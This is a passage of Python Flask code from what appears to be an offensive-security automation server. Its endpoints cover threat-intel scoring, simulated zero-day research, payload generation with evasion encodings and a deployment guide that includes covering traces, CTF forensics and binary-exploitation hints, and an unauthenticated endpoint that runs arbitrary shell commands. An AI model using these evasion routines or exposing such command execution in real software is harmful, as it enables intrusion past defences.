            try:
                cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
                if cve_analysis.get("success"):
                    correlation_results["correlations"].append({
                        "indicator": cve_id,
                        "type": "cve",
                        "analysis": cve_analysis,
                        "threat_level": cve_analysis.get("exploitability_level", "UNKNOWN")
                    })

                    # Add to threat score
                    exploit_score = cve_analysis.get("exploitability_score", 0)
                    correlation_results["threat_score"] += min(exploit_score, 100)

                # Search for existing exploits
                exploits = cve_intelligence.search_existing_exploits(cve_id)
                if exploits.get("success") and exploits.get("total_exploits", 0) > 0:
                    correlation_results["correlations"].append({
                        "indicator": cve_id,
                        "type": "exploit_availability",
                        "exploits_found": exploits.get("total_exploits", 0),
                        "threat_level": "HIGH"
                    })
                    correlation_results["threat_score"] += 25

            except Exception as e:
                logger.warning(f"Error analyzing CVE {cve_id}: {str(e)}")

        # Process IP indicators (basic reputation check simulation)
        for ip in ip_indicators:
            # Simulate threat intelligence lookup
            correlation_results["correlations"].append({
                "indicator": ip,
                "type": "ip_reputation",
                "analysis": {
                    "reputation": "unknown",
                    "geolocation": "unknown",
                    "associated_threats": []
                },
                "threat_level": "MEDIUM"  # Default for unknown IPs
            })

        # Process hash indicators
        for hash_val in hash_indicators:
            correlation_results["correlations"].append({
                "indicator": hash_val,
                "type": "file_hash",
                "analysis": {
                    "hash_type": f"hash{len(hash_val)}",
                    "malware_family": "unknown",
                    "detection_rate": "unknown"
                },
                "threat_level": "MEDIUM"
            })

        # Calculate overall threat score and generate recommendations
        total_indicators = len(indicators)
        if total_indicators > 0:
            correlation_results["threat_score"] = min(correlation_results["threat_score"] / total_indicators, 100)

            if correlation_results["threat_score"] >= 75:
                correlation_results["recommendations"] = [
                    "Immediate threat response required",
                    "Block identified indicators",
                    "Enhance monitoring for related IOCs",
                    "Implement emergency patches for identified CVEs"
                ]
            elif correlation_results["threat_score"] >= 50:
                correlation_results["recommendations"] = [
                    "Elevated threat level detected",
                    "Increase monitoring for identified indicators",
                    "Plan patching for identified vulnerabilities",
                    "Review security controls"
                ]
            else:
                correlation_results["recommendations"] = [
                    "Low to medium threat level",
                    "Continue standard monitoring",
                    "Plan routine patching",
                    "Consider additional threat intelligence sources"
                ]

        result = {
            "success": True,
            "threat_intelligence": correlation_results,
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Threat intelligence correlation completed | Threat Score: {correlation_results['threat_score']:.1f}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in threat intelligence: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/zero-day-research", methods=["POST"])
def zero_day_research():
    """Automated zero-day vulnerability research using AI analysis"""
    try:
        params = request.json
        target_software = params.get("target_software", "")
        analysis_depth = params.get("analysis_depth", "standard")
        source_code_url = params.get("source_code_url", "")

        if not target_software:
            logger.warning("🔬 Zero-day research called without target software")
            return jsonify({
                "success": False,
                "error": "Target software parameter is required"
            }), 400

        logger.info(f"🔬 Starting zero-day research for {target_software} | Depth: {analysis_depth}")

        research_results = {
            "target_software": target_software,
            "analysis_depth": analysis_depth,
            "research_areas": [],
            "potential_vulnerabilities": [],
            "risk_assessment": {},
            "recommendations": []
        }

        # Define research areas based on software type
        common_research_areas = [
            "Input validation vulnerabilities",
            "Memory corruption issues",
            "Authentication bypasses",
            "Authorization flaws",
            "Cryptographic weaknesses",
            "Race conditions",
            "Logic flaws"
        ]

        # Software-specific research areas
        web_research_areas = [
            "Cross-site scripting (XSS)",
            "SQL injection",
            "Server-side request forgery (SSRF)",
            "Insecure deserialization",
            "Template injection"
        ]

        system_research_areas = [
            "Buffer overflows",
            "Privilege escalation",
            "Kernel vulnerabilities",
            "Service exploitation",
            "Configuration weaknesses"
        ]

        # Determine research areas based on target
        target_lower = target_software.lower()
        if any(web_tech in target_lower for web_tech in ["apache", "nginx", "tomcat", "php", "node", "django"]):
            research_results["research_areas"] = common_research_areas + web_research_areas
        elif any(sys_tech in target_lower for sys_tech in ["windows", "linux", "kernel", "driver"]):
            research_results["research_areas"] = common_research_areas + system_research_areas
        else:
            research_results["research_areas"] = common_research_areas

        # Simulate vulnerability discovery based on analysis depth
        vuln_count = {"quick": 2, "standard": 4, "comprehensive": 6}.get(analysis_depth, 4)

        for i in range(vuln_count):
            potential_vuln = {
                "id": f"RESEARCH-{target_software.upper()}-{i+1:03d}",
                "category": research_results["research_areas"][i % len(research_results["research_areas"])],
                "severity": ["LOW", "MEDIUM", "HIGH", "CRITICAL"][i % 4],
                "confidence": ["LOW", "MEDIUM", "HIGH"][i % 3],
                "description": f"Potential {research_results['research_areas'][i % len(research_results['research_areas'])].lower()} in {target_software}",
                "attack_vector": "To be determined through further analysis",
                "impact": "To be assessed",
                "proof_of_concept": "Research phase - PoC development needed"
            }
            research_results["potential_vulnerabilities"].append(potential_vuln)

        # Risk assessment
        high_risk_count = sum(1 for v in research_results["potential_vulnerabilities"] if v["severity"] in ["HIGH", "CRITICAL"])
        total_vulns = len(research_results["potential_vulnerabilities"])

        research_results["risk_assessment"] = {
            "total_areas_analyzed": len(research_results["research_areas"]),
            "potential_vulnerabilities_found": total_vulns,
            "high_risk_findings": high_risk_count,
            "risk_score": min((high_risk_count * 25 + (total_vulns - high_risk_count) * 10), 100),
            "research_confidence": analysis_depth
        }

        # Generate recommendations
        if high_risk_count > 0:
            research_results["recommendations"] = [
                "Prioritize security testing in identified high-risk areas",
                "Conduct focused penetration testing",
                "Implement additional security controls",
                "Consider bug bounty program for target software",
                "Perform code review in identified areas"
            ]
        else:
            research_results["recommendations"] = [
                "Continue standard security testing",
                "Monitor for new vulnerability research",
                "Implement defense-in-depth strategies",
                "Regular security assessments recommended"
            ]

        # Source code analysis simulation
        if source_code_url:
            research_results["source_code_analysis"] = {
                "repository_url": source_code_url,
                "analysis_status": "simulated",
                "findings": [
                    "Static analysis patterns identified",
                    "Potential code quality issues detected",
                    "Security-relevant functions located"
                ],
                "recommendation": "Manual code review recommended for identified areas"
            }

        result = {
            "success": True,
            "zero_day_research": research_results,
            "disclaimer": "This is simulated research for demonstration. Real zero-day research requires extensive manual analysis.",
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Zero-day research completed | Risk Score: {research_results['risk_assessment']['risk_score']}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in zero-day research: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/ai/advanced-payload-generation", methods=["POST"])
def advanced_payload_generation():
    """Generate advanced payloads with AI-powered evasion techniques"""
    try:
        params = request.json
        attack_type = params.get("attack_type", "rce")
        target_context = params.get("target_context", "")
        evasion_level = params.get("evasion_level", "standard")
        custom_constraints = params.get("custom_constraints", "")

        if not attack_type:
            logger.warning("🎯 Advanced payload generation called without attack type")
            return jsonify({
                "success": False,
                "error": "Attack type parameter is required"
            }), 400

        logger.info(f"🎯 Generating advanced {attack_type} payload with {evasion_level} evasion")

        # Enhanced payload generation with contextual AI
        target_info = {
            "attack_type": attack_type,
            "complexity": "advanced",
            "technology": target_context,
            "evasion_level": evasion_level,
            "constraints": custom_constraints
        }

        # Generate base payloads using existing AI system
        base_result = ai_payload_generator.generate_contextual_payload(target_info)

        # Enhance with advanced techniques
        advanced_payloads = []

        for payload_info in base_result.get("payloads", [])[:10]:  # Limit to 10 advanced payloads
            enhanced_payload = {
                "payload": payload_info["payload"],
                "original_context": payload_info["context"],
                "risk_level": payload_info["risk_level"],
                "evasion_techniques": [],
                "deployment_methods": []
            }

            # Apply evasion techniques based on level
            if evasion_level in ["advanced", "nation-state"]:
                # Advanced encoding techniques
                encoded_variants = [
                    {
                        "technique": "Double URL Encoding",
                        "payload": payload_info["payload"].replace("%", "%25").replace(" ", "%2520")
                    },
                    {
                        "technique": "Unicode Normalization",
                        "payload": payload_info["payload"].replace("script", "scr\u0131pt")
                    },
                    {
                        "technique": "Case Variation",
                        "payload": "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload_info["payload"]))
                    }
                ]
                enhanced_payload["evasion_techniques"].extend(encoded_variants)

            if evasion_level == "nation-state":
                # Nation-state level techniques
                advanced_techniques = [
                    {
                        "technique": "Polyglot Payload",
                        "payload": f"/*{payload_info['payload']}*/ OR {payload_info['payload']}"
                    },
                    {
                        "technique": "Time-delayed Execution",
                        "payload": f"setTimeout(function(){{{payload_info['payload']}}}, 1000)"
                    },
                    {
                        "technique": "Environmental Keying",
                        "payload": f"if(navigator.userAgent.includes('specific')){{ {payload_info['payload']} }}"
                    }
                ]
                enhanced_payload["evasion_techniques"].extend(advanced_techniques)

            # Deployment methods
            enhanced_payload["deployment_methods"] = [
                "Direct injection",
                "Parameter pollution",
                "Header injection",
                "Cookie manipulation",
                "Fragment-based delivery"
            ]

            advanced_payloads.append(enhanced_payload)

        # Generate deployment instructions
        deployment_guide = {
            "pre_deployment": [
                "Reconnaissance of target environment",
                "Identification of input validation mechanisms",
                "Analysis of security controls (WAF, IDS, etc.)",
                "Selection of appropriate evasion techniques"
            ],
            "deployment": [
                "Start with least detectable payloads",
                "Monitor for defensive responses",
                "Escalate evasion techniques as needed",
                "Document successful techniques for future use"
            ],
            "post_deployment": [
                "Monitor for payload execution",
                "Clean up traces if necessary",
                "Document findings",
                "Report vulnerabilities responsibly"
            ]
        }

        result = {
            "success": True,
            "advanced_payload_generation": {
                "attack_type": attack_type,
                "evasion_level": evasion_level,
                "target_context": target_context,
                "payload_count": len(advanced_payloads),
                "advanced_payloads": advanced_payloads,
                "deployment_guide": deployment_guide,
                "custom_constraints_applied": custom_constraints if custom_constraints else "none"
            },
            "disclaimer": "These payloads are for authorized security testing only. Ensure proper authorization before use.",
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Advanced payload generation completed | Generated: {len(advanced_payloads)} payloads")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in advanced payload generation: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# CTF COMPETITION EXCELLENCE FRAMEWORK API ENDPOINTS (v8.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/ctf/create-challenge-workflow", methods=["POST"])
def create_ctf_challenge_workflow():
    """Create specialized workflow for CTF challenge"""
    try:
        params = request.json
        challenge_name = params.get("name", "")
        category = params.get("category", "misc")
        difficulty = params.get("difficulty", "unknown")
        points = params.get("points", 100)
        description = params.get("description", "")
        target = params.get("target", "")

        if not challenge_name:
            return jsonify({"error": "Challenge name is required"}), 400

        # Create CTF challenge object
        challenge = CTFChallenge(
            name=challenge_name,
            category=category,
            difficulty=difficulty,
            points=points,
            description=description,
            target=target
        )

        # Generate workflow
        workflow = ctf_manager.create_ctf_challenge_workflow(challenge)

        logger.info(f"🎯 CTF workflow created for {challenge_name} | Category: {category} | Difficulty: {difficulty}")
        return jsonify({
            "success": True,
            "workflow": workflow,
            "challenge": vars(challenge),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating CTF workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/auto-solve-challenge", methods=["POST"])
def auto_solve_ctf_challenge():
    """Attempt to automatically solve a CTF challenge"""
    try:
        params = request.json
        challenge_name = params.get("name", "")
        category = params.get("category", "misc")
        difficulty = params.get("difficulty", "unknown")
        points = params.get("points", 100)
        description = params.get("description", "")
        target = params.get("target", "")

        if not challenge_name:
            return jsonify({"error": "Challenge name is required"}), 400

        # Create CTF challenge object
        challenge = CTFChallenge(
            name=challenge_name,
            category=category,
            difficulty=difficulty,
            points=points,
            description=description,
            target=target
        )

        # Attempt automated solving
        result = ctf_automator.auto_solve_challenge(challenge)

        logger.info(f"🤖 CTF auto-solve attempted for {challenge_name} | Status: {result['status']}")
        return jsonify({
            "success": True,
            "solve_result": result,
            "challenge": vars(challenge),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in CTF auto-solve: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/team-strategy", methods=["POST"])
def create_ctf_team_strategy():
    """Create optimal team strategy for CTF competition"""
    try:
        params = request.json
        challenges_data = params.get("challenges", [])
        team_skills = params.get("team_skills", {})

        if not challenges_data:
            return jsonify({"error": "Challenges data is required"}), 400

        # Convert challenge data to CTFChallenge objects
        challenges = []
        for challenge_data in challenges_data:
            challenge = CTFChallenge(
                name=challenge_data.get("name", ""),
                category=challenge_data.get("category", "misc"),
                difficulty=challenge_data.get("difficulty", "unknown"),
                points=challenge_data.get("points", 100),
                description=challenge_data.get("description", ""),
                target=challenge_data.get("target", "")
            )
            challenges.append(challenge)

        # Generate team strategy
        strategy = ctf_coordinator.optimize_team_strategy(challenges, team_skills)

        logger.info(f"👥 CTF team strategy created | Challenges: {len(challenges)} | Team members: {len(team_skills)}")
        return jsonify({
            "success": True,
            "strategy": strategy,
            "challenges_count": len(challenges),
            "team_size": len(team_skills),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating CTF team strategy: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/suggest-tools", methods=["POST"])
def suggest_ctf_tools():
    """Suggest optimal tools for CTF challenge based on description and category"""
    try:
        params = request.json
        description = params.get("description", "")
        category = params.get("category", "misc")

        if not description:
            return jsonify({"error": "Challenge description is required"}), 400

        # Get tool suggestions
        suggested_tools = ctf_tools.suggest_tools_for_challenge(description, category)
        category_tools = ctf_tools.get_category_tools(f"{category}_recon")

        # Get tool commands
        tool_commands = {}
        for tool in suggested_tools:
            try:
                tool_commands[tool] = ctf_tools.get_tool_command(tool, "TARGET")
            except:
                tool_commands[tool] = f"{tool} TARGET"

        logger.info(f"🔧 CTF tools suggested | Category: {category} | Tools: {len(suggested_tools)}")
        return jsonify({
            "success": True,
            "suggested_tools": suggested_tools,
            "category_tools": category_tools,
            "tool_commands": tool_commands,
            "category": category,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error suggesting CTF tools: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/cryptography-solver", methods=["POST"])
def ctf_cryptography_solver():
    """Advanced cryptography challenge solver with multiple attack methods"""
    try:
        params = request.json
        cipher_text = params.get("cipher_text", "")
        cipher_type = params.get("cipher_type", "unknown")
        key_hint = params.get("key_hint", "")
        known_plaintext = params.get("known_plaintext", "")
        additional_info = params.get("additional_info", "")

        if not cipher_text:
            return jsonify({"error": "Cipher text is required"}), 400

        results = {
            "cipher_text": cipher_text,
            "cipher_type": cipher_type,
            "analysis_results": [],
            "potential_solutions": [],
            "recommended_tools": [],
            "next_steps": []
        }

        # Cipher type identification
        if cipher_type == "unknown":
            # Basic cipher identification heuristics
            if re.match(r'^[0-9a-fA-F]+$', cipher_text.replace(' ', '')):
                results["analysis_results"].append("Possible hexadecimal encoding")
                results["recommended_tools"].extend(["hex", "xxd"])

            if re.match(r'^[A-Za-z0-9+/]+=*$', cipher_text.replace(' ', '')):
                results["analysis_results"].append("Possible Base64 encoding")
                results["recommended_tools"].append("base64")

            if len(set(cipher_text.upper().replace(' ', ''))) <= 26:
                results["analysis_results"].append("Possible substitution cipher")
                results["recommended_tools"].extend(["frequency-analysis", "substitution-solver"])

        # Hash identification
        hash_patterns = {
            32: "MD5",
            40: "SHA1",
            64: "SHA256",
            128: "SHA512"
        }

        clean_text = cipher_text.replace(' ', '').replace('\n', '')
        if len(clean_text) in hash_patterns and re.match(r'^[0-9a-fA-F]+$', clean_text):
            hash_type = hash_patterns[len(clean_text)]
            results["analysis_results"].append(f"Possible {hash_type} hash")
            results["recommended_tools"].extend(["hashcat", "john", "hashid"])

        # Frequency analysis for substitution ciphers
        if cipher_type in ["substitution", "caesar", "vigenere"] or "substitution" in results["analysis_results"]:
            char_freq: Dict[str, int] = {}
            for char in cipher_text.upper():
                if char.isalpha():
                    char_freq[char] = char_freq.get(char, 0) + 1

            if char_freq:
                most_common = max(char_freq.keys(), key=lambda key: char_freq[key])
                results["analysis_results"].append(f"Most frequent character: {most_common} ({char_freq[most_common]} occurrences)")
                results["next_steps"].append("Try substituting most frequent character with 'E'")

        # ROT/Caesar cipher detection
        if cipher_type == "caesar" or len(set(cipher_text.upper().replace(' ', ''))) <= 26:
            results["recommended_tools"].append("rot13")
            results["next_steps"].append("Try all ROT values (1-25)")

        # RSA-specific analysis
        if cipher_type == "rsa" or "rsa" in additional_info.lower():
            results["recommended_tools"].extend(["rsatool", "factordb", "yafu"])
            results["next_steps"].extend([
                "Check if modulus can be factored",
                "Look for small public exponent attacks",
                "Check for common modulus attacks"
            ])

        # Vigenère cipher analysis
        if cipher_type == "vigenere" or "vigenere" in additional_info.lower():
            results["recommended_tools"].append("vigenere-solver")
            results["next_steps"].extend([
                "Perform Kasiski examination for key length",
                "Use index of coincidence analysis",
                "Try common key words"
            ])

        logger.info(f"🔐 CTF crypto analysis completed | Type: {cipher_type} | Tools: {len(results['recommended_tools'])}")
        return jsonify({
            "success": True,
            "analysis": results,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in CTF crypto solver: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/forensics-analyzer", methods=["POST"])
def ctf_forensics_analyzer():
    """Advanced forensics challenge analyzer with multiple investigation techniques"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        analysis_type = params.get("analysis_type", "comprehensive")
        extract_hidden = params.get("extract_hidden", True)
        check_steganography = params.get("check_steganography", True)

        if not file_path:
            return jsonify({"error": "File path is required"}), 400

        results = {
            "file_path": file_path,
            "analysis_type": analysis_type,
            "file_info": {},
            "metadata": {},
            "hidden_data": [],
            "steganography_results": [],
            "recommended_tools": [],
            "next_steps": []
        }

        # Basic file analysis
        try:
            # File command
            file_result = subprocess.run(['file', file_path], capture_output=True, text=True, timeout=30)
            if file_result.returncode == 0:
                results["file_info"]["type"] = file_result.stdout.strip()

                # Determine file category and suggest tools
                file_type = file_result.stdout.lower()
                if "image" in file_type:
                    results["recommended_tools"].extend(["exiftool", "steghide", "stegsolve", "zsteg"])
                    results["next_steps"].extend([
                        "Extract EXIF metadata",
                        "Check for steganographic content",
                        "Analyze color channels separately"
                    ])
                elif "audio" in file_type:
                    results["recommended_tools"].extend(["audacity", "sonic-visualizer", "spectrum-analyzer"])
                    results["next_steps"].extend([
                        "Analyze audio spectrum",
                        "Check for hidden data in audio channels",
                        "Look for DTMF tones or morse code"
                    ])
                elif "pdf" in file_type:
                    results["recommended_tools"].extend(["pdfinfo", "pdftotext", "binwalk"])
                    results["next_steps"].extend([
                        "Extract text and metadata",
                        "Check for embedded files",
                        "Analyze PDF structure"
                    ])
                elif "zip" in file_type or "archive" in file_type:
                    results["recommended_tools"].extend(["unzip", "7zip", "binwalk"])
                    results["next_steps"].extend([
                        "Extract archive contents",
                        "Check for password protection",
                        "Look for hidden files"
                    ])
        except Exception as e:
            results["file_info"]["error"] = str(e)

        # Metadata extraction
        try:
            exif_result = subprocess.run(['exiftool', file_path], capture_output=True, text=True, timeout=30)
            if exif_result.returncode == 0:
                results["metadata"]["exif"] = exif_result.stdout
        except Exception as e:
            results["metadata"]["exif_error"] = str(e)

        # Binwalk analysis for hidden files
        if extract_hidden:
            try:
                binwalk_result = subprocess.run(['binwalk', '-e', file_path], capture_output=True, text=True, timeout=60)
                if binwalk_result.returncode == 0:
                    results["hidden_data"].append({
                        "tool": "binwalk",
                        "output": binwalk_result.stdout
                    })
            except Exception as e:
                results["hidden_data"].append({
                    "tool": "binwalk",
                    "error": str(e)
                })

        # Steganography checks
        if check_steganography:
            # Check for common steganography tools
            steg_tools = ["steghide", "zsteg", "outguess"]
            for tool in steg_tools:
                try:
                    steg_result = None
                    if tool == "steghide":
                        steg_result = subprocess.run([tool, 'info', file_path], capture_output=True, text=True, timeout=30)
                    elif tool == "zsteg":
                        steg_result = subprocess.run([tool, '-a', file_path], capture_output=True, text=True, timeout=30)
                    elif tool == "outguess":
                        steg_result = subprocess.run([tool, '-r', file_path, '/tmp/outguess_output'], capture_output=True, text=True, timeout=30)

                    if steg_result and steg_result.returncode == 0 and steg_result.stdout.strip():
                        results["steganography_results"].append({
                            "tool": tool,
                            "output": steg_result.stdout
                        })
                except Exception as e:
                    results["steganography_results"].append({
                        "tool": tool,
                        "error": str(e)
                    })

        # Strings analysis
        try:
            strings_result = subprocess.run(['strings', file_path], capture_output=True, text=True, timeout=30)
            if strings_result.returncode == 0:
                # Look for interesting strings (flags, URLs, etc.)
                interesting_strings = []
                for line in strings_result.stdout.split('\n'):
                    if any(keyword in line.lower() for keyword in ['flag', 'password', 'key', 'secret', 'http', 'ftp']):
                        interesting_strings.append(line.strip())

                if interesting_strings:
                    results["hidden_data"].append({
                        "tool": "strings",
                        "interesting_strings": interesting_strings[:20]  # Limit to first 20
                    })
        except Exception as e:
            results["hidden_data"].append({
                "tool": "strings",
                "error": str(e)
            })

        logger.info(f"🔍 CTF forensics analysis completed | File: {file_path} | Tools used: {len(results['recommended_tools'])}")
        return jsonify({
            "success": True,
            "analysis": results,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in CTF forensics analyzer: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/binary-analyzer", methods=["POST"])
def ctf_binary_analyzer():
    """Advanced binary analysis for reverse engineering and pwn challenges"""
    try:
        params = request.json
        binary_path = params.get("binary_path", "")
        analysis_depth = params.get("analysis_depth", "comprehensive")  # basic, comprehensive, deep
        check_protections = params.get("check_protections", True)
        find_gadgets = params.get("find_gadgets", True)

        if not binary_path:
            return jsonify({"error": "Binary path is required"}), 400

        results = {
            "binary_path": binary_path,
            "analysis_depth": analysis_depth,
            "file_info": {},
            "security_protections": {},
            "interesting_functions": [],
            "strings_analysis": {},
            "gadgets": [],
            "recommended_tools": [],
            "exploitation_hints": []
        }

        # Basic file information
        try:
            file_result = subprocess.run(['file', binary_path], capture_output=True, text=True, timeout=30)
            if file_result.returncode == 0:
                results["file_info"]["type"] = file_result.stdout.strip()

                # Determine architecture and suggest tools
                file_output = file_result.stdout.lower()
                if "x86-64" in file_output or "x86_64" in file_output:
                    results["file_info"]["architecture"] = "x86_64"
                elif "i386" in file_output or "80386" in file_output:
                    results["file_info"]["architecture"] = "i386"
                elif "arm" in file_output:
                    results["file_info"]["architecture"] = "ARM"

                results["recommended_tools"].extend(["gdb-peda", "radare2", "ghidra"])
        except Exception as e:
            results["file_info"]["error"] = str(e)

        # Security protections check
        if check_protections:
            try:
                checksec_result = subprocess.run(['checksec', '--file', binary_path], capture_output=True, text=True, timeout=30)
                if checksec_result.returncode == 0:
                    results["security_protections"]["checksec"] = checksec_result.stdout

                    # Parse protections and provide exploitation hints
                    output = checksec_result.stdout.lower()
                    if "no canary found" in output:
                        results["exploitation_hints"].append("Stack canary disabled - buffer overflow exploitation possible")
                    if "nx disabled" in output:
                        results["exploitation_hints"].append("NX disabled - shellcode execution on stack possible")
                    if "no pie" in output:
                        results["exploitation_hints"].append("PIE disabled - fixed addresses, ROP/ret2libc easier")
                    if "no relro" in output:
                        results["exploitation_hints"].append("RELRO disabled - GOT overwrite attacks possible")
            except Exception as e:
                results["security_protections"]["error"] = str(e)

        # Strings analysis
        try:
            strings_result = subprocess.run(['strings', binary_path], capture_output=True, text=True, timeout=30)
            if strings_result.returncode == 0:
                strings_output = strings_result.stdout.split('\n')

                # Categorize interesting strings
                interesting_categories = {
                    "functions": [],
                    "format_strings": [],
                    "file_paths": [],
                    "potential_flags": [],
                    "system_calls": []
                }

                for string in strings_output:
                    string = string.strip()
                    if not string:
                        continue

                    # Look for function names
                    if any(func in string for func in ['printf', 'scanf', 'gets', 'strcpy', 'system', 'execve']):
                        interesting_categories["functions"].append(string)

                    # Look for format strings
                    if '%' in string and any(fmt in string for fmt in ['%s', '%d', '%x', '%n']):
                        interesting_categories["format_strings"].append(string)

                    # Look for file paths
                    if string.startswith('/') or '\\' in string:
                        interesting_categories["file_paths"].append(string)

                    # Look for potential flags
                    if any(keyword in string.lower() for keyword in ['flag', 'ctf', 'key', 'password']):
                        interesting_categories["potential_flags"].append(string)

                    # Look for system calls
                    if string in ['sh', 'bash', '/bin/sh', '/bin/bash', 'cmd.exe']:
                        interesting_categories["system_calls"].append(string)

                results["strings_analysis"] = interesting_categories

                # Add exploitation hints based on strings
                if interesting_categories["functions"]:
                    dangerous_funcs = ['gets', 'strcpy', 'sprintf', 'scanf']
                    found_dangerous = [f for f in dangerous_funcs if any(f in s for s in interesting_categories["functions"])]
                    if found_dangerous:
                        results["exploitation_hints"].append(f"Dangerous functions found: {', '.join(found_dangerous)} - potential buffer overflow")

                if interesting_categories["format_strings"]:
                    if any('%n' in s for s in interesting_categories["format_strings"]):
                        results["exploitation_hints"].append("Format string with %n found - potential format string vulnerability")

        except Exception as e:
            results["strings_analysis"] = {"error": str(e)}

        # ROP gadgets search
        if find_gadgets and analysis_depth in ["comprehensive", "deep"]:
            try:
                ropgadget_result = subprocess.run(['ROPgadget', '--binary', binary_path, '--only', 'pop|ret'], capture_output=True, text=True, timeout=60)
                if ropgadget_result.returncode == 0:
                    gadget_lines = ropgadget_result.stdout.split('\n')
                    useful_gadgets = []

                    for line in gadget_lines:
                        if 'pop' in line and 'ret' in line:
                            useful_gadgets.append(line.strip())

                    results["gadgets"] = useful_gadgets[:20]  # Limit to first 20 gadgets

                    if useful_gadgets:
                        results["exploitation_hints"].append(f"Found {len(useful_gadgets)} ROP gadgets - ROP chain exploitation possible")
                        results["recommended_tools"].append("ropper")

            except Exception as e:
                results["gadgets"] = [f"Error finding gadgets: {str(e)}"]

        # Function analysis with objdump
        if analysis_depth in ["comprehensive", "deep"]:
            try:
                objdump_result = subprocess.run(['objdump', '-t', binary_path], capture_output=True, text=True, timeout=30)
                if objdump_result.returncode == 0:
                    functions = []
                    for line in objdump_result.stdout.split('\n'):
                        if 'F .text' in line:  # Function in text section
                            parts = line.split()
                            if len(parts) >= 6:
                                func_name = parts[-1]
                                functions.append(func_name)

                    results["interesting_functions"] = functions[:50]  # Limit to first 50 functions
            except Exception as e:
                results["interesting_functions"] = [f"Error analyzing functions: {str(e)}"]

        # Add tool recommendations based on findings
        if results["exploitation_hints"]:
            results["recommended_tools"].extend(["pwntools", "gdb-peda", "one-gadget"])

        if "format string" in str(results["exploitation_hints"]).lower():
            results["recommended_tools"].append("format-string-exploiter")

        logger.info(f"🔬 CTF binary analysis completed | Binary: {binary_path} | Hints: {len(results['exploitation_hints'])}")
        return jsonify({
            "success": True,
            "analysis": results,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in CTF binary analyzer: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# ADVANCED PROCESS MANAGEMENT API ENDPOINTS (v10.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/process/execute-async", methods=["POST"])
def execute_command_async():
    """Execute command asynchronously using enhanced process management"""
    try:
        params = request.json
        command = params.get("command", "")
        context = params.get("context", {})

        if not command:
            return jsonify({"error": "Command parameter is required"}), 400

        # Execute command asynchronously
        task_id = enhanced_process_manager.execute_command_async(command, context)

        logger.info(f"🚀 Async command execution started | Task ID: {task_id}")
        return jsonify({
            "success": True,
            "task_id": task_id,
            "command": command,
            "status": "submitted",
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in async command execution: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/get-task-result/<task_id>", methods=["GET"])
def get_async_task_result(task_id):
    """Get result of asynchronous task"""
    try:
        result = enhanced_process_manager.get_task_result(task_id)

        if result["status"] == "not_found":
            return jsonify({"error": "Task not found"}), 404

        logger.info(f"📋 Task result retrieved | Task ID: {task_id} | Status: {result['status']}")
        return jsonify({
            "success": True,
            "task_id": task_id,
            "result": result,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting task result: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/pool-stats", methods=["GET"])
def get_process_pool_stats():
    """Get process pool statistics and performance metrics"""
    try:
        stats = enhanced_process_manager.get_comprehensive_stats()

        logger.info(f"📊 Process pool stats retrieved | Active workers: {stats['process_pool']['active_workers']}")
        return jsonify({
            "success": True,
            "stats": stats,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting pool stats: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/cache-stats", methods=["GET"])
def get_cache_stats():
    """Get advanced cache statistics"""
    try:
        cache_stats = enhanced_process_manager.cache.get_stats()

        logger.info(f"💾 Cache stats retrieved | Hit rate: {cache_stats['hit_rate']:.1f}%")
        return jsonify({
            "success": True,
            "cache_stats": cache_stats,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting cache stats: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/clear-cache", methods=["POST"])
def clear_process_cache():
    """Clear the advanced cache"""
    try:
        enhanced_process_manager.cache.clear()

        logger.info("🧹 Process cache cleared")
        return jsonify({
            "success": True,
            "message": "Cache cleared successfully",
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error clearing cache: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/resource-usage", methods=["GET"])
def get_resource_usage():
